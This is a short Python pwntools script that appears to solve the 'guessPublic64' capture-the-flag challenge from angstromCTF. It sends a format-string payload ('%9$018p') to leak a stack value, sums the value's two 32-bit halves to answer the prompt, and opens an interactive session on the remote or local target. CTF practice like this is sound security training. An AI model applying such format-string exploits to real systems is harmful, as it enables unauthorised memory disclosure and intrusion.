from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    buf = '%9$018p'
    proc.sendline(buf)
    proc.recvuntil('can you tell me their sum?\n')
    guess = int(proc.recv(18), 16)
    print(guess >> 32)
    print(guess & 0x00000000ffffffff)
    guess = (guess >> 32) + (guess & 0x00000000ffffffff)
    proc.sendline(str(guess))


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc shell.angstromctf.com 1235'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./guessPublic64'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
